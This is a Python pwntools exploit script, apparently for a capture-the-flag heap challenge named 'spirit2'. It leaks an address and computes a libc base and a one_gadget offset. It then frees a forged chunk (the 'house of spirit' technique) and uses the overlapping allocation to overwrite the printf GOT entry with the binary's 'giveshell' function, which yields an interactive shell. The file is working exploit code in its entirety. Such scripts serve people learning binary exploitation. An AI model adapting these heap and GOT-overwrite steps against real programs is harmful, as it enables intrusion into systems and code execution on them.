#!/usr/bin/python
from pwn import *

context.log_level = 'debug'
p = process("./spirit2")
elf = ELF("./spirit2")
giveshell = elf.symbols['giveshell']
one_gadget_off = 0x4f322

def add(size):
    p.sendlineafter("> ", '1')
    p.sendlineafter("Size: ", str(size))

def free(address):
    p.sendlineafter("> ", '2')
    p.sendlineafter("Address: ", str(address))

def edit(index, data):
    p.sendlineafter("> ", '3')
    p.sendlineafter("Index: ", str(index))
    p.send(data)

leak = int(p.recv(14), 16)
free_arg = leak + 8
ret = leak + 0xd0
log.info("leak: "+hex(leak))
log.info("free_arg: "+hex(free_arg))
log.info("ret: "+hex(ret))
one_gadget = (leak-0x27ee1b8fb8)+one_gadget_off
libcbase = leak-0x27ee1b8fb8
log.info("libcbase: "+hex(libcbase))

#gdb.attach(p)
add(0x30)
free(free_arg)
add(0x20) #0x20+0x10 = 0x30
#edit(1, 'A'*0x10+p64(ret))
edit(1, 'A'*0x10 + p64(elf.got['printf']))
#edit(0, p64(giveshell) + p64(giveshell))
edit(0, p64(giveshell))

gdb.attach(p)
#p.sendlineafter("> ", '5') #to return

p.interactive()
